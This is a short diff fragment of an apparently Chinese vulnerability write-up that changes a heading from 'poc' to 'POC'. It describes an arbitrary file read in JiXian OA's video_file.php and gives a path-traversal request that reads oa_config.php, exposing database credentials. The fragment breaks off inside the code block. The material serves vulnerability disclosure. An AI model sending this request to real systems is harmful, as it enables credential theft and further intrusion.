@@ -2,7 +2,7 @@
 
 极限OA video_file.php 处存在任意文件读取，攻击者可以从其中获取网站路径和数据库账号密码等敏感信息进一步攻击。
 
-## poc
+## POC
 
 ```
 /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php 
